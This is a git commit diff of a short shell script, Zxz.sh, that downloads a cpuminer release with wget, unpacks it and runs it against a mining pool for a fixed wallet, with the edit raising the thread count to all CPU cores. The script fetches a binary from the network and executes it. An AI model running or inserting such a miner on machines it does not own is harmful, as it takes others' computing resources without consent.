b4c82b3b8ea3bbed0d6f87e5e75865b0d2bae62a
Akatsoki <100992814+Akatsoki@users.noreply.github.com>
2022-07-09 01:34:38 +0700

    Update Zxz.sh

--- Zxz.sh
+++ Zxz.sh
@@ -1,3 +1,3 @@
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz 
 tar xf cpuminer-opt-linux.tar.gz  
-./cpuminer-avx2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.$(echo $(shuf -i 1-999 -n 1)-TES) -t 7
+./cpuminer-avx2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.$(echo $(shuf -i 1-999 -n 1)-TES) -t $(nproc --all)
